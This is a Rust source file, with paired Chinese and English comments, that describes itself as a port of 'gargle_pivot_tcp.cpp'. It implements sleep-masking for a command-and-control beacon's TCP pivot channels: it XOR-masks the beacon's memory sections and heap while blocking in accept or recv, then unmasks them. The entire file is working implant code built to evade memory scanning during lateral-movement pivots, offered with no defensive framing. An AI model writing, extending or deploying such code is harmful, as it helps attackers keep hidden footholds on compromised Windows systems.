//! gargle_pivot_tcp.cpp 的移植版 — 围绕 TCP 等待的睡眠掩码，用于 pivot
//! Port of gargle_pivot_tcp.cpp — sleep-masking around TCP waits for pivot
//! 通道。
//! channels.
//!
//! `GargleWaitTCP` 阻塞（信标被掩码）直到对端在套接字上发送数据；
//! `GargleWaitTCP` blocks (with the beacon masked) until the peer sends data
//! `GargleAccept` 执行阻塞的 `accept`（掩码）并返回新套接字。
//! on the socket; `GargleAccept` performs a blocking `accept` (masked) and
//! 两者只在设置 `SETTING_GARGLE_NOOK` 且没有工作线程运行时
//! returns the new socket. Both only mask when `SETTING_GARGLE_NOOK` is set
//! 才掩码；否则退化为普通操作，与 C++ 完全一致。
//! and no worker threads are running; otherwise they degrade to the plain
//! operations, exactly like the C++.
//!
//! C++ 在掩码状态下执行复制的 asm trampoline；Rust 移植版
//! The C++ executed a copied asm trampoline while masked; the Rust port
//! 对相同内存范围应用相同的 XOR 掩码（参见
//! applies the same XOR mask to the same memory ranges (see
//! `crate::gargleint::mask_sections_and_heap`），并直接在
//! `crate::gargleint::mask_sections_and_heap`) and blocks directly in
//! `accept`/`recv` 中阻塞。
//! `accept`/`recv`.

use crate::beacon::SETTING_GARGLE_NOOK;
use crate::gargleint::{gargle_trampoline, GargleP};
use crate::settings::setting_int;
use crate::state::THREAD_COUNT;
use std::sync::atomic::Ordering;
use std::time::Duration;
use windows_sys::Win32::Networking::WinSock::{
    accept, recv, MSG_PEEK, SOCKADDR, SOCKET, WSAEWOULDBLOCK, WSAGetLastError,
};

/// `GARGLE_TCP_ACTION_RECV` — 等待对端发送数据。
/// `GARGLE_TCP_ACTION_RECV` — wait until the peer sends data.
pub const GARGLE_TCP_ACTION_RECV: i32 = 0;
/// `GARGLE_TCP_ACTION_ACCEPT` — 等待传入连接。
/// `GARGLE_TCP_ACTION_ACCEPT` — wait for an incoming connection.
pub const GARGLE_TCP_ACTION_ACCEPT: i32 = 1;

type AcceptProc = unsafe extern "system" fn(SOCKET, *mut SOCKADDR, *mut i32) -> SOCKET;
type RecvProc = unsafe extern "system" fn(SOCKET, *mut u8, i32, i32) -> i32;

/// `GARGLE_TCP_ARGS` — 传递给 TCP 掩码例程的参数。
/// `GARGLE_TCP_ARGS` — arguments passed to the TCP mask routine.
///
/// C++ 字段 `in` 是 Rust 关键字，因此移植为 `input`。
/// The C++ field `in` is a Rust keyword, so it is ported as `input`.
#[repr(C)]
pub struct GargleTcpArgs {
    /// 要执行的操作：[`GARGLE_TCP_ACTION_RECV`] 或 [`GARGLE_TCP_ACTION_ACCEPT`]。
    /// What to do: [`GARGLE_TCP_ACTION_RECV`] or [`GARGLE_TCP_ACTION_ACCEPT`].
    pub action: i32,
    /// 要监视/监听的套接字（C++ `in`）。
    /// The socket to watch / listen on (C++ `in`).
    pub input: SOCKET,
    /// ACCEPT 操作的结果套接字（C++ `out`）。
    /// Result socket for the ACCEPT action (C++ `out`).
    pub out: SOCKET,
    pub accept: AcceptProc,
    pub recv: RecvProc,
}

/// TCP 变体的 `GARGLEF`。
/// `GARGLEF` for the TCP variant.
type GargleF = fn(&GargleP, &mut GargleTcpArgs);

/// `_gargle_it` — 掩码 TCP 等待/接受。
/// `_gargle_it` — masked TCP wait/accept.
///
/// 掩码信标数据，执行请求的套接字操作，然后取消掩码。
/// Masks the beacon data, performs the requested socket operation, then
/// `args` 中的函数指针镜像 C++ 结构；操作直接调用 Win32 API
/// unmasks. The function pointers in `args` mirror the C++ struct; the
/// （语义相同）。RECV 操作使用窥探（MSG_PEEK），因此第一帧
/// operations call the Win32 API directly (identical semantics). The RECV
/// 保留在套接字缓冲区中供通道读取器使用。ACCEPT 操作将结果
/// action peeks (MSG_PEEK) so the first frame stays in the socket buffer for
/// 存入 `args.out`，与 C++ 的 `return args.out` 完全一致。
/// the channel reader. The ACCEPT action stores the result in `args.out`,
/// exactly like the C++ `return args.out`.
fn gargle_it(parms: &GargleP, args: &mut GargleTcpArgs) {
    crate::gargleint::mask_sections_and_heap(parms);

    match args.action {
        GARGLE_TCP_ACTION_ACCEPT => {
            /* 等待我们的连接（阻塞 accept，掩码） */
            /* wait for our connection (blocking accept, masked) */
            args.out = unsafe { accept(args.input, std::ptr::null_mut(), std::ptr::null_mut()) };
        }
        _ => {
            /* GARGLE_TCP_ACTION_RECV：等待对端发送数据 */
            /* GARGLE_TCP_ACTION_RECV: wait until the peer sends data */
            let mut buf = [0u8; 1];
            loop {
                let nread = unsafe { recv(args.input, buf.as_mut_ptr(), 1, MSG_PEEK) };
                if nread > 0 {
                    break;
                }
                if nread == 0 {
                    /* 对端关闭了连接 */
                    /* the peer closed the connection */
                    break;
                }
                let err = unsafe { WSAGetLastError() };
                if err != WSAEWOULDBLOCK {
                    break;
                }
                std::thread::sleep(Duration::from_millis(100));
            }
        }
    }

    crate::gargleint::unmask_sections_and_heap(parms);
}

/// `setup_trampoline2` — 一次性 trampoline/参数设置。
/// `setup_trampoline2` — one-time trampoline/parameter setup.
fn setup_trampoline2() {
    gargle_trampoline(
        (setup_trampoline2 as fn()) as usize as *mut u8,
        (gargle_it as GargleF) as usize as *mut u8,
    );
}

/// `GargleWaitTCP` — 在信标被掩码的情况下阻塞，直到对端在套接字 `s`
/// `GargleWaitTCP` — block, with the beacon masked, until the peer sends data
/// 上发送数据。禁用 gargle 或有工作线程运行时不做任何事
/// on socket `s`. Does nothing when gargle is disabled or worker threads are
/// （C++ 在这种情况下立即返回）。
/// running (the C++ returns immediately in that case).
pub fn gargle_wait_tcp(s: isize) {
    if setting_int(SETTING_GARGLE_NOOK) == 0 || THREAD_COUNT.load(Ordering::SeqCst) > 0 {
        return;
    }

    /* 创建我们的 trampoline */
    /* create our trampoline, please */
    setup_trampoline2();

    /* 设置我们的参数 */
    /* setup our arguments */
    let mut args = GargleTcpArgs {
        action: GARGLE_TCP_ACTION_RECV,
        input: s as SOCKET,
        out: windows_sys::Win32::Networking::WinSock::INVALID_SOCKET,
        accept,
        recv: recv as RecvProc,
    };

    /* 获取要掩码的堆段。 */
    /* get the heap sections to mask. */
    crate::gargleint::refresh_heap_records();

    /* 调用我们的函数 */
    /* call our function */
    let parms = crate::gargleint::gparms();
    gargle_it(&parms, &mut args);
}

/// `GargleAccept` — 在信标被掩码的情况下接受传入连接，并返回新套接字。
/// `GargleAccept` — accept an incoming connection with the beacon masked, and
/// 禁用 gargle 或有工作线程运行时回退为普通的 `accept(s, NULL, 0)`。
/// return the new socket. Falls back to a plain `accept(s, NULL, 0)` when
/// gargle is disabled or worker threads are running.
pub fn gargle_accept(s: isize) -> isize {
    if setting_int(SETTING_GARGLE_NOOK) == 0 || THREAD_COUNT.load(Ordering::SeqCst) > 0 {
        return unsafe { accept(s as SOCKET, std::ptr::null_mut(), std::ptr::null_mut()) } as isize;
    }

    /* 创建我们的 trampoline */
    /* create our trampoline, please */
    setup_trampoline2();

    /* 设置我们的参数 */
    /* setup our arguments */
    let mut args = GargleTcpArgs {
        action: GARGLE_TCP_ACTION_ACCEPT,
        input: s as SOCKET,
        out: windows_sys::Win32::Networking::WinSock::INVALID_SOCKET,
        accept,
        recv: recv as RecvProc,
    };

    /* 获取要掩码的堆段。 */
    /* get the heap sections to mask. */
    crate::gargleint::refresh_heap_records();

    /* 调用我们的函数 */
    /* call our function */
    let parms = crate::gargleint::gparms();
    gargle_it(&parms, &mut args);

    /* 返回我们结构体中的输出值 */
    /* return the out value from our struct */
    args.out as isize
}
